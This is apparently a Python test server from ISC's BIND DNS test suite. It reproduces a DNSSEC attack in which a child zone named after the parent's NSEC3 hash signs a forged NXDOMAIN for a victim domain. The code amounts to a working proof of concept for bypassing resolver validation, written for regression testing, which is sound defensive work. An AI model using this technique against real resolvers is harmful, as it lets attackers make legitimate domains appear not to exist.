#!/usr/bin/python3

# Copyright (C) Internet Systems Consortium, Inc. ("ISC")
#
# SPDX-License-Identifier: MPL-2.0
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0.  If a copy of the MPL was not distributed with this
# file, you can obtain one at https://mozilla.org/MPL/2.0/.
#
# See the COPYRIGHT file distributed with this work for additional
# information regarding copyright ownership.

from collections.abc import AsyncGenerator
from dataclasses import dataclass
from pathlib import Path

import json

from cryptography.hazmat.primitives import serialization

import dns.dnssec
import dns.flags
import dns.message
import dns.name
import dns.rcode
import dns.rdata
import dns.rdataclass
import dns.rdatatype
import dns.rrset

from isctest.asyncserver import (
    AsyncDnsServer,
    DnsResponseSend,
    QueryContext,
    ResponseHandler,
)

TTL = 300
TLD = "tld.test."
APEX_HASH = "1B40241KFORIOG780N4IKSCRLVETPCTQ"
ATTACKER = f"{APEX_HASH.lower()}.{TLD}"
VICTIM = f"victim.{TLD}"
AUTH_IP = "10.53.0.1"


@dataclass(frozen=True)
class Key:
    zone: dns.name.Name
    private_key: object
    dnskey: dns.rdata.Rdata
    ds: dns.rdata.Rdata


def name(text: str) -> dns.name.Name:
    return dns.name.from_text(text)


def load_keys() -> dict[str, Key]:
    path = Path(__file__).resolve().parent / "keys.json"
    with path.open(encoding="utf-8") as keys_file:
        raw_keys = json.load(keys_file)

    keys = {}
    for zone, raw_key in raw_keys.items():
        private_key = serialization.load_pem_private_key(
            raw_key["private_pem"].encode("ascii"),
            password=None,
        )
        dnskey = dns.rdata.from_text(
            dns.rdataclass.IN, dns.rdatatype.DNSKEY, raw_key["dnskey"]
        )
        ds = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.DS, raw_key["ds"])
        keys[zone] = Key(name(zone), private_key, dnskey, ds)

    return keys


def rrset(owner: str, rdtype: dns.rdatatype.RdataType, *rdatas: str) -> dns.rrset.RRset:
    return dns.rrset.from_text(owner, TTL, dns.rdataclass.IN, rdtype, *rdatas)


def rrset_from_rdata(owner: str, rdata: dns.rdata.Rdata) -> dns.rrset.RRset:
    return dns.rrset.from_rdata(name(owner), TTL, rdata)


def rrsig_rrset(covered: dns.rrset.RRset, signer: Key) -> dns.rrset.RRset:
    rrsig = dns.dnssec.sign(
        covered,
        signer.private_key,
        signer.zone,
        signer.dnskey,
        lifetime=86400,
        verify=True,
    )
    return dns.rrset.from_rdata(covered.name, covered.ttl, rrsig)


def add_signed(
    section: list[dns.rrset.RRset], covered: dns.rrset.RRset, signer: Key
) -> None:
    section.append(covered)
    section.append(rrsig_rrset(covered, signer))


def dnskey_rrset(zone: str, zone_key: Key) -> dns.rrset.RRset:
    return rrset_from_rdata(zone, zone_key.dnskey)


def ds_rrset(zone: str, zone_key: Key) -> dns.rrset.RRset:
    return rrset_from_rdata(zone, zone_key.ds)


def soa_rrset(zone: str) -> dns.rrset.RRset:
    return rrset(
        zone,
        dns.rdatatype.SOA,
        f"ns.{zone} hostmaster.{zone} 1 3600 600 86400 300",
    )


def ns_rrset(zone: str, ns_target: str) -> dns.rrset.RRset:
    return rrset(zone, dns.rdatatype.NS, ns_target)


def glue_rrset(ns_target: str, address: str) -> dns.rrset.RRset:
    return rrset(ns_target, dns.rdatatype.A, address)


def answer_dnskey(response: dns.message.Message, zone: str, zone_key: Key) -> None:
    add_signed(response.answer, dnskey_rrset(zone, zone_key), zone_key)


def answer_soa(response: dns.message.Message, zone: str, zone_key: Key) -> None:
    add_signed(response.answer, soa_rrset(zone), zone_key)


def answer_ns(
    response: dns.message.Message, zone: str, ns_target: str, zone_key: Key
) -> None:
    add_signed(response.answer, ns_rrset(zone, ns_target), zone_key)


class SignedResponseHandler(ResponseHandler):
    def __init__(self, keys: dict[str, Key]) -> None:
        self.keys = keys

    async def get_responses(
        self, qctx: QueryContext
    ) -> AsyncGenerator[DnsResponseSend, None]:
        qctx.prepare_new_response(with_zone_data=False)
        qctx.response.flags |= dns.flags.AA
        qctx.response.set_rcode(dns.rcode.NOERROR)
        self.respond(qctx)
        yield DnsResponseSend(qctx.response, authoritative=True)

    def respond(self, qctx: QueryContext) -> None:
        raise NotImplementedError


def child_nsec3_rrset() -> dns.rrset.RRset:
    rdata = dns.rdata.from_text(
        dns.rdataclass.IN,
        dns.rdatatype.NSEC3,
        f"1 0 0 - {APEX_HASH} NS SOA RRSIG DNSKEY NSEC3PARAM",
    )
    return dns.rrset.from_rdata(name(f"{APEX_HASH}.{TLD}"), TTL, rdata)


def forged_nxdomain(response: dns.message.Message, keys: dict[str, Key]) -> None:
    response.set_rcode(dns.rcode.NXDOMAIN)

    add_signed(response.authority, soa_rrset(TLD), keys[TLD])

    # The owner name derives zone "tld.test.", but the RRSIG signer is the
    # malicious child zone "1b40241kforiog780n4ikscrlvetpctq.tld.test.".
    add_signed(response.authority, child_nsec3_rrset(), keys[ATTACKER])


class VictimForgedNxdomainHandler(SignedResponseHandler):
    """
    This serves the forged response for the victim's domain.
    """

    def match(self, qctx: QueryContext) -> bool:
        return qctx.qname == name(VICTIM) and qctx.qtype == dns.rdatatype.A

    def respond(self, qctx: QueryContext) -> None:
        forged_nxdomain(qctx.response, self.keys)


class ChildDsHandler(SignedResponseHandler):
    """
    This will spoof the response for the malicious zone when qtype is DS.
    It is actually a validly signed DS response.
    """

    def match(self, qctx: QueryContext) -> bool:
        return qctx.qname == name(ATTACKER) and qctx.qtype == dns.rdatatype.DS

    def respond(self, qctx: QueryContext) -> None:
        response = qctx.response
        zone = ATTACKER
        child_key = self.keys[ATTACKER]
        parent_key = self.keys[TLD]

        add_signed(response.answer, ds_rrset(zone, child_key), parent_key)


class AttackerZoneHandler(SignedResponseHandler):
    """
    Acts as the malicious authoritative name server. The zone being served
    is the hashed label of the parent zone (tld.test). This will respond
    for all queries qtype SOA, DNSKEY, NS at the apex. Any names below
    the apex are answered with an NXDOMAIN with no NSEC or NSEC3 present.
    """

    def match(self, qctx: QueryContext) -> bool:
        return qctx.qname.is_subdomain(name(ATTACKER))

    def respond(self, qctx: QueryContext) -> None:
        if qctx.qname == name(ATTACKER):
            if qctx.qtype == dns.rdatatype.DNSKEY:
                answer_dnskey(qctx.response, ATTACKER, self.keys[ATTACKER])
            elif qctx.qtype == dns.rdatatype.SOA:
                answer_soa(qctx.response, ATTACKER, self.keys[ATTACKER])
            else:
                answer_ns(
                    qctx.response, ATTACKER, f"ns.{ATTACKER}", self.keys[ATTACKER]
                )
                qctx.response.additional.append(glue_rrset(f"ns.{ATTACKER}", AUTH_IP))
            return

        qctx.response.set_rcode(dns.rcode.NXDOMAIN)
        add_signed(qctx.response.authority, soa_rrset(ATTACKER), self.keys[ATTACKER])


class TldZoneHandler(SignedResponseHandler):
    """
    Acts as the TLD who is being used in the attack, but is not a standard
    name server. It only responds with validly signed records for DNSKEY, SOA
    and NS on the apex. Any names below the apex are answered with an NXDOMAIN
    with no NSEC or NSEC3 present.

    If we turn this into a regular name server than the attack won't work.
    The attack assumes that the adversary can inject these responses on-path.
    """

    def match(self, qctx: QueryContext) -> bool:
        return qctx.qname.is_subdomain(name(TLD))

    def respond(self, qctx: QueryContext) -> None:
        if qctx.qname == name(TLD):
            if qctx.qtype == dns.rdatatype.DNSKEY:
                answer_dnskey(qctx.response, TLD, self.keys[TLD])
            elif qctx.qtype == dns.rdatatype.SOA:
                answer_soa(qctx.response, TLD, self.keys[TLD])
            else:
                answer_ns(qctx.response, TLD, "ns.tld.test.", self.keys[TLD])
                qctx.response.additional.append(glue_rrset("ns.tld.test.", AUTH_IP))
            return

        qctx.response.set_rcode(dns.rcode.NXDOMAIN)
        add_signed(qctx.response.authority, soa_rrset(TLD), self.keys[TLD])


def main() -> None:
    keys = load_keys()
    server = AsyncDnsServer(default_aa=True)
    server.install_response_handlers(
        VictimForgedNxdomainHandler(keys),
        ChildDsHandler(keys),
        AttackerZoneHandler(keys),
        TldZoneHandler(keys),
    )
    server.run()


if __name__ == "__main__":
    main()
